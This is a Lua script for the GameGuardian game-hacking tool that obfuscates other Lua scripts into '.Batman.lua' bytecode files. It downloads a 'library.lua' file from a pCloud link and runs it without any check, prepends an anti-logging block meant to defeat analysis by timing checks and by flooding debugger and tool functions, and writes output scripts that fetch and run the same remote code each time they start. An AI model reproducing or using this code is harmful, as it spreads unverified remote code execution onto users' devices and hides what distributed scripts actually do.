(function()
g = {}
g.last = "/sdcard/"
g.info = nil
g.config = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("[^/]+$") .. "cfg"
g.data = loadfile(g.config)
if g.data ~= nil then
  g.info = g.data()
  g.data = nil
end
if g.info == nil then
  g.info = { g.last, g.last:gsub("/[^/]+$", "") }
end
while true do
  g.info = gg.prompt({
    '📂 Select file:',
    '📂 Select folder:'
  }, g.info, {
    'file',
    'path'
  })

  if not g.info then return end

  gg.saveVariable(g.info, g.config)
  g.last = g.info[1]

  if loadfile(g.last) == nil then
    gg.alert("⚠️ Script not Found! ⚠️")
    return
  end

  g.out = g.last:match("[^/]+$"):gsub("%.lua$", "") .. ".Batman.lua"
  g.out = g.info[2] .. "/" .. g.out

  local f = io.open(g.last, "r")
  local DATA = f:read("*a")
  f:close()
  
Link = "https://def1.pcloud.com/D4Z910N3k7ZbcvDjP7ZZZQ5kq0kZ2ZZhhRZkZPvzZSRZzYZkQZvk9w5ZLgocHKJQMRfs8jJwxBQ82R10ydfX/library.lua"
path = "/sdcard/Android/data/"..gg.PACKAGE
Name = "library.lua"
batman = gg.makeRequest(Link).content
if batman == nil then
os.exit() end

io.open(path .. "/" .. Name, "w"):write(batman)

local luaR = require("library")

local Antilog = [[

local logged
local clock=os['clock']
gg['clearResults']()
local time1=clock()
gg['setRanges']('262144')
for i=0,2 do
 gg.searchNumber('0',4,true)
end
local time2=clock()
while time2-time1-('0.80'-0)>0 do
 print(time2-time1)
 _ENV=nil return
end

local long,pcall="\092",_ENV['pcall']
for i=1,'23' do
 long=long..long
end

local long_={}
long_['value']=long long_['noob']=1
long_['😅']=2 long_['yeyeye']=3
long_['log me']=4 long_['easy right?']=5
long_['address']="0x1" long_['flags']='4'

local long2={}
for i=1,'1024' do
 long2[#long2+1]={address=i,value=long_.value,flags=long_.flags,name=long_.name}
end

gg['removeListItems'](long2)

for i,v in pairs({gg["getResultsCount"],gg["getTargetPackage"],gg["getValuesRange"],gg["loadResults"],gg["alert"],gg["bytes"],gg["copyText"],gg["searchAddress"],io["open"],gg["refineAddress"],string["reverse"],gg["toast"],gg['getValues'],gg['setValues'],string["dump"],debug["traceback"],gg["removeResults"],gg["removeListItems"],string["char"],gg['editAll'],gg['searchNumber']}) do
 pcall(v,long2)
end

local getinfo,traceback=debug['getinfo'],debug['traceback']
for i=1,'1000' do
 getinfo(i,nil,long2)
 traceback(long2,nil,long2)
end
]]

DATA = Antilog..DATA

local INV = II(DATA)

  local FINAL = [[
(function()

Link = "https://def1.pcloud.com/D4Z910N3k7ZbcvDjP7ZZZQ5kq0kZ2ZZhhRZkZPvzZSRZzYZkQZvk9w5ZLgocHKJQMRfs8jJwxBQ82R10ydfX/library.lua"
path = "/sdcard/Android/data/"..gg.PACKAGE
Name = "library.lua"
batman = gg.makeRequest(Link).content
if batman == nil then
os.exit() end
io.open(path .. "/" .. Name, "w"):write(batman)

local luaR2 = require("library")

local H = [=[
]] .. INV .. [[
]=]

local f = by(Batman(H))
if f then Games(f) end

end)()
]]

io.open(g.out,"w"):write(string.gsub(string.dump(load(FINAL), true), 'LuaR', 'LuaR', 1)):close()

  return
end

end)()